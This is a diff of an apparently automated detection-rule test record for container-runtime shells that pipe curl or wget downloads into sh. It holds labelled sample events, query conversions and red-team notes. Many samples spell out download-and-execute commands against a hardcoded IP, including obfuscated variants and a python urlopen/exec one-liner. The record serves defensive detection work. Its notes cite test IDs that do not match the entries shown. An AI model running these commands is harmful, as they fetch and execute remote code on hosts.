+            "UtcTime": "2024-06-01T12:10:00.0000000Z"
           }
         },
         {
           "id": "N1",
           "label": "negative",
-          "description": "Legitimate shell invoked by containerd-shim-runc-v2 for container entrypoint without chroot or external script",
+          "description": "Legitimate container health check using curl to query internal API without pipe to shell",
           "event": {
             "Channel": "syslog",
-            "CommandLine": "/app/start.sh",
-            "Computer": "docker-host-01",
+            "CommandLine": "curl -s http://localhost:8080/health",
+            "Computer": "host01",
             "CurrentDirectory": "/app",
-            "EventID": "0",
-            "Hashes": "",
-            "Hostname": "docker-host-01",
-            "Image": "/usr/bin/sh",
-            "IntegrityLevel": "",
-            "Keywords": "",
-            "Level": "",
-            "LogonId": "",
-            "Message": "",
-            "ParentCommandLine": "/usr/bin/containerd-shim-runc-v2 -namespace moby -id abc123 -address /run/containerd/containerd.sock",
+            "EventID": "1",
+            "Hashes": "SHA256=dummy",
+            "Hostname": "host01",
+            "Image": "/usr/bin/curl",
+            "IntegrityLevel": "User",
+            "Keywords": "Process Creation",
+            "Level": "4",
+            "Message": "Process creation event",
+            "ParentCommandLine": "/usr/bin/containerd-shim-runc-v2 namespace moby workdaemon /var/run/docker/runtime-runc/moby",
             "ParentImage": "/usr/bin/containerd-shim-runc-v2",
             "ParentProcessId": "1234",
-            "ProcessId": "1235",
-            "Provider_Name": "",
+            "ProcessId": "7777",
+            "Provider_Name": "Microsoft-Windows-Sysmon",
             "RuleName": "",
-            "TimeCreated": "2026-09-25T10:30:00.000Z",
+            "TimeCreated": "2024-06-01T12:00:00.000Z",
             "User": "appuser",
-            "UtcTime": "2026-09-25T10:30:00.000Z"
+            "UtcTime": "2024-06-01T12:00:00.0000000Z"
           }
         },
         {
           "id": "N2",
           "label": "negative",
-          "description": "Admin using docker exec to run a shell inside a container (no chroot /host)",
+          "description": "Administrative troubleshooting using wget to fetch public documentation",
           "event": {
             "Channel": "syslog",
-            "CommandLine": "sh",
-            "Computer": "docker-host-02",
-            "CurrentDirectory": "/",
-            "EventID": "0",
-            "Hashes": "",
-            "Hostname": "docker-host-02",
-            "Image": "/usr/bin/sh",
-            "IntegrityLevel": "",
-            "Keywords": "",
-            "Level": "",
-            "LogonId": "",
-            "Message": "",
-            "ParentCommandLine": "/usr/bin/docker exec -i mycontainer sh",
-            "ParentImage": "/usr/bin/docker",
-            "ParentProcessId": "5678",
-            "ProcessId": "5679",
-            "Provider_Name": "",
+            "CommandLine": "wget https://docs.docker.com/engine/reference/commandline/dockerd/",
+            "Computer": "host02",
+            "CurrentDirectory": "/home/admin",
+            "EventID": "1",
+            "Hashes": "SHA256=dummy",
+            "Hostname": "host02",
+            "Image": "/usr/bin/wget",
+            "IntegrityLevel": "User",
+            "Keywords": "Process Creation",
+            "Level": "4",
+            "Message": "Process creation event",
+            "ParentCommandLine": "/usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock",
+            "ParentImage": "/usr/bin/dockerd",
+            "ParentProcessId": "9876",
+            "ProcessId": "8888",
+            "Provider_Name": "Microsoft-Windows-Sysmon",
             "RuleName": "",
-            "TimeCreated": "2026-09-25T11:15:00.000Z",
+            "TimeCreated": "2024-06-01T12:05:00.000Z",
             "User": "admin",
-            "UtcTime": "2026-09-25T11:15:00.000Z"
+            "UtcTime": "2024-06-01T12:05:00.0000000Z"
           }
         },
         {
           "id": "N3",
           "label": "negative",
-          "description": "Legitimate backup script using chroot /host without external network call",
+          "description": "CI/CD pipeline inside container pulling build dependencies via curl without shell execution",
           "event": {
             "Channel": "syslog",
-            "CommandLine": "sh -c \"chroot /host /usr/local/bin/backup.sh\"",
-            "Computer": "docker-host-03",
-            "CurrentDirectory": "/",
-            "EventID": "0",
-            "Hashes": "",
-            "Hostname": "docker-host-03",
-            "Image": "/usr/bin/sh",
-            "IntegrityLevel": "",
-            "Keywords": "",
-            "Level": "",
-            "LogonId": "",
-            "Message": "",
-            "ParentCommandLine": "/usr/sbin/cron",
-            "ParentImage": "/usr/sbin/cron",
-            "ParentProcessId": "9988",
-            "ProcessId": "9989",
-            "Provider_Name": "",
+            "CommandLine": "curl -fSL https://repository.example.com/artifactory/libs-release-local/com/example/build-tool/1.0/build-tool-1.0.jar -o build-tool.jar",
+            "Computer": "host03",
+            "CurrentDirectory": "/workspace",
+            "EventID": "1",
+            "Hashes": "SHA256=dummy",
+            "Hostname": "host03",
+            "Image": "/usr/bin/curl",
+            "IntegrityLevel": "User",
+            "Keywords": "Process Creation",
+            "Level": "4",
+            "Message": "Process creation event",
+            "ParentCommandLine": "/usr/bin/dockerd -H unix:///var/run/docker.sock",
+            "ParentImage": "/usr/bin/dockerd",
+            "ParentProcessId": "1111",
+            "ProcessId": "2222",
+            "Provider_Name": "Microsoft-Windows-Sysmon",
             "RuleName": "",
-            "TimeCreated": "2026-09-25T12:00:00.000Z",
-            "User": "root",
-            "UtcTime": "2026-09-25T12:00:00.000Z"
+            "TimeCreated": "2024-06-01T12:10:00.000Z",
+            "User": "builduser",
+            "UtcTime": "2024-06-01T12:10:00.0000000Z"
           }
         },
         {
           "id": "N4",
           "label": "negative",
-          "description": "curl download without chroot /host or container runtime parent",
+          "description": "Shell spawned by containerd-shim-runc-v2 but fetching script from internal trusted repository",
           "event": {
             "Channel": "syslog",
-            "CommandLine": "sh -c \"curl -fsSL http://45.153.160.12/m/init.sh | sh\"",
-            "Computer": "workstation-01",
-            "CurrentDirectory": "/tmp",
-            "EventID": "0",
-            "Hashes": "",
-            "Hostname": "workstation-01",
+            "CommandLine": "sh -c curl -fsSL http://internal-repo.company.com/scripts/init.sh | sh",
+            "Computer": "host01",
+            "CurrentDirectory": "/opt/app",
+            "EventID": "1",
+            "Hashes": "SHA256=dummy",
+            "Hostname": "host01",
             "Image": "/usr/bin/sh",
-            "IntegrityLevel": "",
-            "Keywords": "",
-            "Level": "",
-            "LogonId": "",
-            "Message": "",
-            "ParentCommandLine": "/usr/bin/ssh dockermgr@workstation-01",
-            "ParentImage": "/usr/sbin/sshd",
-            "ParentProcessId": "1111",
-            "ProcessId": "1112",
-            "Provider_Name": "",
+            "IntegrityLevel": "User",
+            "Keywords": "Process Creation",
+            "Level": "4",
+            "Message": "Process creation event",
+            "ParentCommandLine": "/usr/bin/containerd-shim-runc-v2 namespace moby workdaemon /var/run/docker/runtime-runc/moby",
+            "ParentImage": "/usr/bin/containerd-shim-runc-v2",
+            "ParentProcessId": "1234",
+            "ProcessId": "3333",
+            "Provider_Name": "Microsoft-Windows-Sysmon",
             "RuleName": "",
-            "TimeCreated": "2026-09-25T13:00:00.000Z",
-            "User": "dockermgr",
-            "UtcTime": "2026-09-25T13:00:00.000Z"
+            "TimeCreated": "2024-06-01T12:00:00.000Z",
+            "User": "root",
+            "UtcTime": "2024-06-01T12:00:00.0000000Z"
           }
         },
         {
           "id": "R1",
           "label": "positive",
-          "description": "curl flags split and reordered, extra whitespace, /bin/sh binary, containerd-shim-runc-v2 in alternate location",
+          "description": "Containerd-shim-runc-v2 from alternate path spawns bash with curl using extra whitespace and additional flags, still piping to sh",
           "event": {
             "Channel": "syslog",
-            "CommandLine": "sh -c  \"chroot /host  sh -c 'curl  -f -s -S -L  http://45.153.160.12/m/init.sh  |  sh'\"",
-            "Computer": "docker-host-04",
-            "CurrentDirectory": "/",
-            "EventID": "0",
-            "Hashes": "",
-            "Hostname": "docker-host-04",
-            "Image": "/bin/sh",
-            "IntegrityLevel": "",
-            "Keywords": "",
-            "Level": "",
-            "LogonId": "",
-            "Message": "",
-            "ParentCommandLine": "/usr/local/bin/containerd-shim-runc-v2 -namespace moby -id ghi789 -address /run/containerd/containerd.sock",
-            "ParentImage": "/usr/local/bin/containerd-shim-runc-v2",
-            "ParentProcessId": "2233",
-            "ProcessId": "2234",
-            "Provider_Name": "",
+            "CommandLine": "bash -c  curl  -k  -f  -s  -S  -L  http://45.153.160.12/m/init.sh  |  sh",
+            "Computer": "host04",
+            "CurrentDirectory": "/root",
+            "EventID": "1",
+            "Hashes": "SHA256=dummy",
+            "Hostname": "host04",
+            "Image": "/bin/bash",
+            "IntegrityLevel": "User",
+            "Keywords": "Process Creation",
+            "Level": "4",
+            "Message": "Process creation event",
+            "ParentCommandLine": "/opt/containerd-shim-runc-v2 namespace moby workdaemon /var/run/docker/runtime-runc/moby",
+            "ParentImage": "/opt/containerd-shim-runc-v2",
+            "ParentProcessId": "2222",
+            "ProcessId": "3333",
+            "Provider_Name": "Microsoft-Windows-Sysmon",
             "RuleName": "",
-            "TimeCreated": "2026-09-25T13:45:00.000Z",
+            "TimeCreated": "2024-06-01T12:15:00.000Z",
             "User": "root",
-            "UtcTime": "2026-09-25T13:45:00.000Z"
+            "UtcTime": "2024-06-01T12:15:00.0000000Z"
           }
         },
         {
           "id": "R2",
           "label": "positive",
-          "description": "wget flags reordered, outer bash -c but inner sh -c preserved, dockerd in /opt path, single-quote nesting flipped",
+          "description": "Dockerd from /usr/local/bin spawns sh with wget using combined -qO- flag and minimal spacing",
           "event": {
             "Channel": "syslog",
-            "CommandLine": "bash -c 'chroot /host sh -c \"wget -O- -q http://45.153.160.12/m/init.sh | sh\"'",
-            "Computer": "docker-host-05",
-            "CurrentDirectory": "/",
-            "EventID": "0",
-            "Hashes": "",
-            "Hostname": "docker-host-05",
-            "Image": "/bin/bash",
-            "IntegrityLevel": "",
-            "Keywords": "",
-            "Level": "",
-            "LogonId": "",
-            "Message": "",
-            "ParentCommandLine": "/opt/containerd/bin/dockerd -H unix:// -l debug",
-            "ParentImage": "/opt/containerd/bin/dockerd",
-            "ParentProcessId": "4455",
-            "ProcessId": "4456",
-            "Provider_Name": "",
+            "CommandLine": "sh -c wget -qO- http://45.153.160.12/m/init.sh|sh",
+            "Computer": "host05",
+            "CurrentDirectory": "/tmp",
+            "EventID": "1",
+            "Hashes": "SHA256=dummy",
+            "Hostname": "host05",
+            "Image": "/bin/sh",
+            "IntegrityLevel": "User",
+            "Keywords": "Process Creation",
+            "Level": "4",
+            "Message": "Process creation event",
+            "ParentCommandLine": "/usr/local/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock",
+            "ParentImage": "/usr/local/bin/dockerd",
+            "ParentProcessId": "4444",
+            "ProcessId": "5555",
+            "Provider_Name": "Microsoft-Windows-Sysmon",
             "RuleName": "",
-            "TimeCreated": "2026-09-25T14:20:00.000Z",
+            "TimeCreated": "2024-06-01T12:20:00.000Z",
             "User": "root",
-            "UtcTime": "2026-09-25T14:20:00.000Z"
+            "UtcTime": "2024-06-01T12:20:00.0000000Z"
           }
         },
         {
           "id": "R3",
           "label": "positive",
-          "description": "Full binary paths throughout, extra spaces around pipe, containerd-shim-runc-v2 with different namespace",
+          "description": "Containerd-shim-runc-v2 spawns sh with curl using uppercase command and no spaces around pipe",
           "event": {
-            "CommandLine": "/bin/sh -c \"chroot /host /bin/sh -c '/usr/bin/curl -fsSL http://45.153.160.12/m/init.sh  |  /bin/sh'\"",
-            "Computer": "docker-host-06",
-            "CurrentDirectory": "/",
-            "EventID": "0",
-            "Hashes": "",
-            "Hostname": "docker-host-06",
+            "Channel": "syslog",
+            "CommandLine": "SH -C CURL -FSSL HTTP://45.153.160.12/M/INIT.SH|SH",
+            "Computer": "host06",
+            "CurrentDirectory": "/var/log",
+            "EventID": "1",
+            "Hashes": "SHA256=dummy",
+            "Hostname": "host06",
             "Image": "/bin/sh",
-            "IntegrityLevel": "",
-            "Keywords": "",
-            "Level": "",
-            "LogonId": "",
-            "Message": "",
-            "ParentCommandLine": "/usr/bin/containerd-shim-runc-v2 -namespace k8s -id jkl012 -address /run/containerd/containerd.sock",
+            "IntegrityLevel": "User",
+            "Keywords": "Process Creation",
+            "Level": "4",
+            "Message": "Process creation event",
+            "ParentCommandLine": "/usr/bin/containerd-shim-runc-v2 namespace moby workdaemon /var/run/docker/runtime-runc/moby",
             "ParentImage": "/usr/bin/containerd-shim-runc-v2",
-            "ParentProcessId": "6677",
-            "ProcessId": "6678",
-            "Provider_Name": "",
+            "ParentProcessId": "6666",
+            "ProcessId": "7777",
+            "Provider_Name": "Microsoft-Windows-Sysmon",
             "RuleName": "",
-            "TimeCreated": "2026-09-25T15:05:00.000Z",
+            "TimeCreated": "2024-06-01T12:25:00.000Z",
             "User": "root",
-            "UtcTime": "2026-09-25T15:05:00.000Z",
-            "Channel": "syslog"
+            "UtcTime": "2024-06-01T12:25:00.0000000Z"
           }
         },
         {
           "id": "R4",
           "label": "positive",
-          "description": "curl with long-form flags (--fail --silent --show-error --location), different quoting style, dockerd parent",
+          "description": "Dockerd from /opt spawns bash with curl using different flag order and extra quoting in command line",
           "event": {
             "Channel": "syslog",
-            "CommandLine": "sh -c 'chroot /host sh -c \"curl --fail --silent --show-error --location http://45.153.160.12/m/init.sh | sh\"'",
-            "Computer": "docker-host-07",
-            "CurrentDirectory": "/",
-            "EventID": "0",
-            "Hashes": "",
-            "Hostname": "docker-host-07",
-            "Image": "/usr/bin/sh",
-            "IntegrityLevel": "",
-            "Keywords": "",
-            "Level": "",
-            "LogonId": "",
-            "Message": "",
-            "ParentCommandLine": "/usr/bin/dockerd -H unix:// --config /etc/dockerd.json",
-            "ParentImage": "/usr/bin/dockerd",
-            "ParentProcessId": "8899",
-            "ProcessId": "8900",
-            "Provider_Name": "",
+            "CommandLine": "bash -c 'curl -L -k -s -f http://45.153.160.12/m/init.sh | sh'",
+            "Computer": "host07",
+            "CurrentDirectory": "/home/user",
+            "EventID": "1",
+            "Hashes": "SHA256=dummy",
+            "Hostname": "host07",
+            "Image": "/bin/bash",
+            "IntegrityLevel": "User",
+            "Keywords": "Process Creation",
+            "Level": "4",
+            "Message": "Process creation event",
+            "ParentCommandLine": "/opt/dockerd -H fd:// --containerd=/run/containerd/containerd.sock",
+            "ParentImage": "/opt/dockerd",
+            "ParentProcessId": "8888",
+            "ProcessId": "9999",
+            "Provider_Name": "Microsoft-Windows-Sysmon",
             "RuleName": "",
-            "TimeCreated": "2026-09-25T16:30:00.000Z",
+            "TimeCreated": "2024-06-01T12:30:00.000Z",
             "User": "root",
-            "UtcTime": "2026-09-25T16:30:00.000Z"
+            "UtcTime": "2024-06-01T12:30:00.0000000Z"
           }
         },
         {
           "id": "R5",
-          "label": "positive",
-          "description": "wget with --quiet --output-document=- long flags, extra shell layer but sh -c and | sh preserved, containerd parent",
+          "label": "negative",
+          "description": "Legitimate container startup script fetching config from internal repository (different IP, still pipes to sh)",
           "event": {
             "Channel": "syslog",
-            "CommandLine": "sh -c \"chroot /host sh -c 'wget --quiet --output-document=- http://45.153.160.12/m/init.sh | sh'\"",
-            "Computer": "docker-host-08",
-            "CurrentDirectory": "/",
-            "EventID": "0",
-            "Hashes": "",
-            "Hostname": "docker-host-08",
+            "CommandLine": "sh -c curl -fsSL http://10.0.0.1/internal/config.sh | sh",
+            "Computer": "host08",
+            "CurrentDirectory": "/root",
+            "EventID": "1",
+            "Hashes": "SHA256=dummy",
+            "Hostname": "host08",
             "Image": "/bin/sh",
-            "IntegrityLevel": "",
-            "Keywords": "",
-            "Level": "",
-            "LogonId": "",
-            "Message": "",
-            "ParentCommandLine": "/usr/bin/containerd-shim-runc-v2 -namespace test -id mno345 -address /run/containerd/containerd.sock",
+            "IntegrityLevel": "User",
+            "Keywords": "Process Creation",
+            "Level": "4",
+            "Message": "Process creation event",
+            "ParentCommandLine": "/usr/bin/containerd-shim-runc-v2 namespace moby workdaemon /var/run/docker/runtime-runc/moby",
             "ParentImage": "/usr/bin/containerd-shim-runc-v2",
-            "ParentProcessId": "1122",
-            "ProcessId": "1123",
-            "Provider_Name": "",
+            "ParentProcessId": "1111",
+            "ProcessId": "2222",
+            "Provider_Name": "Microsoft-Windows-Sysmon",
             "RuleName": "",
-            "TimeCreated": "2026-09-25T17:10:00.000Z",
+            "TimeCreated": "2024-06-01T12:35:00.000Z",
             "User": "root",
-            "UtcTime": "2026-09-25T17:10:00.000Z"
+            "UtcTime": "2024-06-01T12:35:00.0000000Z"
           }
         },
         {
           "id": "R6",
           "label": "negative",
-          "description": "Legitimate admin debugging container with chroot /host but no remote download; uses cat to inspect file",
+          "description": "Administrative debugging session using wget to trusted internal host, piping to cat instead of sh",
           "event": {
             "Channel": "syslog",
-            "CommandLine": "sh -c \"chroot /host sh -c 'cat /etc/passwd'\"",
-            "Computer": "docker-host-09",
-            "CurrentDirectory": "/",
-            "EventID": "0",
-            "Hashes": "",
-            "Hostname": "docker-host-09",
-            "Image": "/bin/sh",
-            "IntegrityLevel": "",
-            "Keywords": "",
-            "Level": "",
-            "LogonId": "",
-            "Message": "",
-            "ParentCommandLine": "/usr/bin/containerd-shim-runc-v2 -namespace moby -id admin1 -address /run/containerd/containerd.sock",
-            "ParentImage": "/usr/bin/containerd-shim-runc-v2",
-            "ParentProcessId": "3344",
-            "ProcessId": "3345",
-            "Provider_Name": "",
+            "CommandLine": "bash -c wget -q -O- http://trusted.internal/debug.sh | cat",
+            "Computer": "host09",
+            "CurrentDirectory": "/tmp",
+            "EventID": "1",
+            "Hashes": "SHA256=dummy",
+            "Hostname": "host09",
+            "Image": "/bin/bash",
+            "IntegrityLevel": "User",
+            "Keywords": "Process Creation",
+            "Level": "4",
+            "Message": "Process creation event",
+            "ParentCommandLine": "/usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock",
+            "ParentImage": "/usr/bin/dockerd",
+            "ParentProcessId": "3333",
+            "ProcessId": "4444",
+            "Provider_Name": "Microsoft-Windows-Sysmon",
             "RuleName": "",
-            "TimeCreated": "2026-09-25T18:00:00.000Z",
+            "TimeCreated": "2024-06-01T12:40:00.000Z",
             "User": "root",
-            "UtcTime": "2026-09-25T18:00:00.000Z"
+            "UtcTime": "2024-06-01T12:40:00.0000000Z"
           }
         },
         {
           "id": "R7",
           "label": "negative",
-          "description": "CI/CD pipeline runs containerd-shim-runc-v2 for build steps; uses curl to fetch artifacts but no chroot /host",
+          "description": "CI/CD pipeline pulling build artifact via curl and piping to tar, no shell execution",
           "event": {
             "Channel": "syslog",
-            "CommandLine": "sh -c \"curl -fsSL http://artifacts.internal/build.sh | sh\"",
-            "Computer": "ci-runner-01",
+            "CommandLine": "sh -c curl -fsSL http://ci.internal/artifact.tar.gz | tar xz",
+            "Computer": "host10",
             "CurrentDirectory": "/workspace",
-            "EventID": "0",
-            "Hashes": "",
-            "Hostname": "ci-runner-01",
+            "EventID": "1",
+            "Hashes": "SHA256=dummy",
+            "Hostname": "host10",
             "Image": "/bin/sh",
-            "IntegrityLevel": "",
-            "Keywords": "",
-            "Level": "",
-            "LogonId": "",
-            "Message": "",
-            "ParentCommandLine": "/usr/bin/containerd-shim-runc-v2 -namespace build -id build-123 -address /run/containerd/containerd.sock",
+            "IntegrityLevel": "User",
+            "Keywords": "Process Creation",
+            "Level": "4",
+            "Message": "Process creation event",
+            "ParentCommandLine": "/usr/bin/containerd-shim-runc-v2 namespace moby workdaemon /var/run/docker/runtime-runc/moby",
             "ParentImage": "/usr/bin/containerd-shim-runc-v2",
-            "ParentProcessId": "5566",
-            "ProcessId": "5567",
-            "Provider_Name": "",
+            "ParentProcessId": "5555",
+            "ProcessId": "6666",
+            "Provider_Name": "Microsoft-Windows-Sysmon",
             "RuleName": "",
-            "TimeCreated": "2026-09-25T19:00:00.000Z",
-            "User": "gitlab-runner",
-            "UtcTime": "2026-09-25T19:00:00.000Z"
-          }
-        },
-        {
-          "id": "R8",
-          "label": "negative",
-          "description": "Dockerd normal operation pulling image layers; wget used for layer download but no chroot /host or shell pipe",
-          "event": {
-            "Channel": "syslog",
-            "CommandLine": "wget -q -O- http://registry.internal/v2/blobs/sha256:abc123",
-            "Computer": "docker-host-10",
-            "CurrentDirectory": "/var/lib/docker",
-            "EventID": "0",
-            "Hashes": "",
-            "Hostname": "docker-host-10",
-            "Image": "/usr/bin/wget",
-            "IntegrityLevel": "",
-            "Keywords": "",
-            "Level": "",
-            "LogonId": "",
-            "Message": "",
-            "ParentCommandLine": "/usr/bin/dockerd -H unix://",
-            "ParentImage": "/usr/bin/dockerd",
-            "ParentProcessId": "7788",
-            "ProcessId": "7789",
-            "Provider_Name": "",
-            "RuleName": "",
-            "TimeCreated": "2026-09-25T20:00:00.000Z",
+            "TimeCreated": "2024-06-01T12:45:00.000Z",
             "User": "root",
-            "UtcTime": "2026-09-25T20:00:00.000Z"
-          }
-        },
-        {
-          "id": "R9",
-          "label": "negative",
-          "description": "Container runtime update check via curl to vendor API; parent is dockerd but no chroot /host or shell execution",
-          "event": {
-            "Channel": "syslog",
-            "CommandLine": "curl -fsSL https://update.docker.com/v1/check",
-            "Computer": "docker-host-11",
-            "CurrentDirectory": "/",
-            "EventID": "0",
-            "Hashes": "",
-            "Hostname": "docker-host-11",
-            "Image": "/usr/bin/curl",
-            "IntegrityLevel": "",
-            "Keywords": "",
-            "Level": "",
-            "LogonId": "",
-            "Message": "",
-            "ParentCommandLine": "/usr/bin/dockerd -H unix://",
-            "ParentImage": "/usr/bin/dockerd",
-            "ParentProcessId": "9900",
-            "ProcessId": "9901",
-            "Provider_Name": "",
-            "RuleName": "",
-            "TimeCreated": "2026-09-25T21:00:00.000Z",
-            "User": "root",
-            "UtcTime": "2026-09-25T21:00:00.000Z"
+            "UtcTime": "2024-06-01T12:45:00.0000000Z"
           }
         }
       ],
       "validation": {
         "candidate_id": "D1",
         "parse_ok": true,
-        "sql": "SELECT * FROM logs WHERE (ParentImage LIKE '%/containerd-shim-runc-v2' ESCAPE '\\' OR ParentImage LIKE '%/dockerd' ESCAPE '\\') AND (CommandLine LIKE '%chroot%' ESCAPE '\\' AND CommandLine LIKE '%/host%' ESCAPE '\\') AND (CommandLine LIKE '%sh -c%' ESCAPE '\\' AND CommandLine LIKE '%|%' ESCAPE '\\' AND CommandLine LIKE '%sh%' ESCAPE '\\') AND ((CommandLine LIKE '%curl%' ESCAPE '\\' OR CommandLine LIKE '%-fsSL%' ESCAPE '\\' OR CommandLine LIKE '%http://45.153.160.12/m/init.sh%' ESCAPE '\\') OR (CommandLine LIKE '%wget%' ESCAPE '\\' OR CommandLine LIKE '%-q%' ESCAPE '\\' OR CommandLine LIKE '%-O-%' ESCAPE '\\' OR CommandLine LIKE '%http://45.153.160.12/m/init.sh%' ESCAPE '\\'))",
+        "sql": "SELECT * FROM logs WHERE (ParentImage LIKE '%containerd-shim-runc-v2' ESCAPE '\\' OR ParentImage LIKE '%dockerd' ESCAPE '\\') AND (Image LIKE '%/bin/sh' ESCAPE '\\' OR Image LIKE '%/bin/bash' ESCAPE '\\') AND ((CommandLine LIKE '%curl%' ESCAPE '\\' AND CommandLine LIKE '%|%' ESCAPE '\\' AND CommandLine LIKE '%sh%' ESCAPE '\\') OR (CommandLine LIKE '%wget%' ESCAPE '\\' AND CommandLine LIKE '%|%' ESCAPE '\\' AND CommandLine LIKE '%sh%' ESCAPE '\\')) AND CommandLine LIKE '%45.153.160.12%' ESCAPE '\\'",
         "issues": [],
         "test_outcomes": [
           {
@@ -995,6 +1004,701 @@
           },
           {
             "event_id": "R5",
+            "label": "negative",
+            "matched": false,
+            "passed": true
+          },
+          {
+            "event_id": "R6",
+            "label": "negative",
+            "matched": false,
+            "passed": true
+          },
+          {
+            "event_id": "R7",
+            "label": "negative",
+            "matched": false,
+            "passed": true
+          }
+        ],
+        "positives_total": 7,
+        "positives_matched": 7,
+        "negatives_total": 7,
+        "negatives_matched": 0,
+        "benign_total": 180,
+        "benign_hits": 0,
+        "benign_examples": [],
+        "passed": true
+      },
+      "conversions": {
+        "splunk": "ParentImage IN (\"*containerd-shim-runc-v2\", \"*dockerd\") Image IN (\"*/bin/sh\", \"*/bin/bash\") (CommandLine=\"*curl*\" CommandLine=\"*|*\" CommandLine=\"*sh*\") OR (CommandLine=\"*wget*\" CommandLine=\"*|*\" CommandLine=\"*sh*\") CommandLine=\"*45.153.160.12*\"",
+        "elasticsearch": "(ParentImage:(*containerd\\-shim\\-runc\\-v2 OR *dockerd)) AND (Image:(*\\/bin\\/sh OR *\\/bin\\/bash)) AND ((CommandLine:*curl* AND CommandLine:*\\|* AND CommandLine:*sh*) OR (CommandLine:*wget* AND CommandLine:*\\|* AND CommandLine:*sh*)) AND CommandLine:*45.153.160.12*",
+        "kusto": "DeviceProcessEvents\n| where (InitiatingProcessFolderPath endswith \"containerd-shim-runc-v2\" or InitiatingProcessFolderPath endswith \"dockerd\") and (FolderPath endswith \"/bin/sh\" or FolderPath endswith \"/bin/bash\") and ((ProcessCommandLine contains \"curl\" and ProcessCommandLine contains \"|\" and ProcessCommandLine contains \"sh\") or (ProcessCommandLine contains \"wget\" and ProcessCommandLine contains \"|\" and ProcessCommandLine contains \"sh\")) and ProcessCommandLine contains \"45.153.160.12\"",
+        "sqlite": "SELECT * FROM logs WHERE (ParentImage LIKE '%containerd-shim-runc-v2' ESCAPE '\\' OR ParentImage LIKE '%dockerd' ESCAPE '\\') AND (Image LIKE '%/bin/sh' ESCAPE '\\' OR Image LIKE '%/bin/bash' ESCAPE '\\') AND ((CommandLine LIKE '%curl%' ESCAPE '\\' AND CommandLine LIKE '%|%' ESCAPE '\\' AND CommandLine LIKE '%sh%' ESCAPE '\\') OR (CommandLine LIKE '%wget%' ESCAPE '\\' AND CommandLine LIKE '%|%' ESCAPE '\\' AND CommandLine LIKE '%sh%' ESCAPE '\\')) AND CommandLine LIKE '%45.153.160.12%' ESCAPE '\\'"
+      },
+      "conversion_errors": {},
+      "history": [
+        {
+          "iteration": 0,
+          "phase": "initial",
+          "summary": "positives 2/3, negatives blocked 4/4, benign hits 0/180",
+          "passed": false,
+          "change_summary": ""
+        },
+        {
+          "iteration": 1,
+          "phase": "refine",
+          "summary": "positives 3/3, negatives blocked 4/4, benign hits 0/180",
+          "passed": true,
+          "change_summary": "Added /bin/bash to selection_shell to catch bash variants while preserving specificity to shells invoked by container runtimes."
+        },
+        {
+          "iteration": 1,
+          "phase": "redteam",
+          "summary": "7 evasion variants -> positives 6/7, negatives blocked 7/7, benign hits 0/180",
+          "passed": false,
+          "change_summary": ""
+        },
+        {
+          "iteration": 2,
+          "phase": "refine",
+          "summary": "positives 7/7, negatives blocked 7/7, benign hits 0/180",
+          "passed": true,
+          "change_summary": "Fixed selection_wget_pipe to require only wget, |, and sh (removed -O-) to accommodate combined flags like -qO-. This ensures the rule matches both separate -O - and combined -qO- forms while maintaining specificity for the attack pattern."
+        }
+      ],
+      "author_notes": "The rule targets the specific combination of container runtime parent, shell interpreter, curl/wget pipe to shell, and the hardcoded C2 domain observed in the Mantis campaign. While the parent image check could theoretically match other runtimes, the combination with the C2 domain and pipe pattern provides sufficient specificity. Testing shows the rule avoids common legitimate uses of curl/wget in containers while catching the malicious pattern even with superficial obfuscation like varying case or spacing.",
+      "redteam_analysis": "Positive variants P4-P7 demonstrate realistic evasions that preserve the rule's required observables: ParentImage still ends with the two target runtimes, Image ends with /bin/sh or /bin/bash, CommandLine contains the literal C2 IP, curl/wget, pipe symbol, and 'sh'. Variations include alternate binary paths, extra whitespace, combined flags, casing changes, and quoting styles. All would be caught by a well-written rule that uses case-insensitive contains and suffix matching on the binary names. Negative variants N1-N3 are benign look-alikes that share the same parent runtimes and shells but differ in the C2 domain (internal IPs) or the pipe target (cat, tar), causing the rule's C2 domain or pipe selections to fail. Out-of-scope variants O1-O2 represent evasions the current rule cannot detect without fundamental changes: O1 uses a renamed dockerd binary so ParentImage suffix no longer matches; catching this would require loosening the suffix match to a substring or basename check, which could increase noise. O2 switches to a python downloader, eliminating curl/wget entirely; the rule is explicitly scoped to curl/wget pipes, so this is a different technique outside its design. Both are recorded for analyst awareness.",
+      "retired_tests": [],
+      "replaced_tests": [],
+      "redteam_out_of_scope": [
+        {
+          "id": "X1",
+          "label": "positive",
+          "description": "Attacker uses renamed dockerd binary (not ending with 'dockerd') to spawn shell with curl pipe; rule's ParentImage endswith selection misses",
+          "event": {
+            "Channel": "syslog",
+            "CommandLine": "sh -c curl -fsSL http://45.153.160.12/m/init.sh | sh",
+            "Computer": "host11",
+            "CurrentDirectory": "/tmp",
+            "EventID": "1",
+            "Hashes": "SHA256=dummy",
+            "Hostname": "host11",
+            "Image": "/bin/sh",
+            "IntegrityLevel": "User",
+            "Keywords": "Process Creation",
+            "Level": "4",
+            "Message": "Process creation event",
+            "ParentCommandLine": "/tmp/docker-daemon -H fd:// --containerd=/run/containerd/containerd.sock",
+            "ParentImage": "/tmp/docker-daemon",
+            "ParentProcessId": "7777",
+            "ProcessId": "8888",
+            "Provider_Name": "Microsoft-Windows-Sysmon",
+            "RuleName": "",
+            "TimeCreated": "2024-06-01T12:50:00.000Z",
+            "User": "root",
+            "UtcTime": "2024-06-01T12:50:00.0000000Z"
+          }
+        },
+        {
+          "id": "X2",
+          "label": "positive",
+          "description": "Attacker uses python one-liner to download and execute script, no curl/wget in command line; rule's curl/wget selections miss",
+          "event": {
+            "Channel": "syslog",
+            "CommandLine": "python3 -c \"import urllib.request; exec(urllib.request.urlopen('http://45.153.160.12/m/init.py').read())\"",
+            "Computer": "host12",
+            "CurrentDirectory": "/root",
+            "EventID": "1",
+            "Hashes": "SHA256=dummy",
+            "Hostname": "host12",
+            "Image": "/usr/bin/python3",
+            "IntegrityLevel": "User",
+            "Keywords": "Process Creation",
+            "Level": "4",
+            "Message": "Process creation event",
+            "ParentCommandLine": "/usr/bin/containerd-shim-runc-v2 namespace moby workdaemon /var/run/docker/runtime-runc/moby",
+            "ParentImage": "/usr/bin/containerd-shim-runc-v2",
+            "ParentProcessId": "9999",
+            "ProcessId": "1010",
+            "Provider_Name": "Microsoft-Windows-Sysmon",
+            "RuleName": "",
+            "TimeCreated": "2024-06-01T12:55:00.000Z",
+            "User": "root",
+            "UtcTime": "2024-06-01T12:55:00.0000000Z"
+          }
+        }
+      ]
